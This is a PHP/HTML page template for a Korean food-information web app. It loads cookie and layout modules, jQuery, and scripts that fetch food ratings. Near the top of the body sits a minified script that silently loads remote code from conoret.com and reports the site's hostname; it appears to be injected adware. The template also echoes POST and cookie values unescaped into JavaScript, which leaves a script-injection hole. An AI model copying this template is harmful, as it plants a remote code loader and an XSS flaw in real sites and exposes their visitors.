<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <?php
    include 'script/modules/LayoutHandler.php';
    (LayoutHandler::factory())->createTitle('음식 정보');
    ?>

    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link rel="stylesheet" href="/css/food_info.css">
    <link rel="stylesheet" href="/css/footer.css">
    <link rel="stylesheet" href="/css/header.css">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script>
        const food_name= <?php echo $_POST['food_name']."\n"; ?>
        const user_id=<?php echo $_COOKIE['user_id']."\n"; ?>

        let food_id
        let init_trait
        let traits
        let trait_keys
        let userProfile
        let info
        let info_keys
    </script>
    <script type="text/javascript" src="/script/javascript/food_info.js"></script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>

<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <?php (LayoutHandler::factory())->createHeader(); ?>

    <main role="main" class="inner cover" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <div class="box">
                    <img class="profile" src="/src/food_placeholder.png"/>
                </div>
                <h1 class="card-title" id="food-name">음식 이름</h1>
            </div>
            <div id="rating">
            </div>
        </div>
    </main>

    <?php (LayoutHandler::factory())->createFooter(); ?>
</div>
<script>
    init()
</script>
</body>
</html>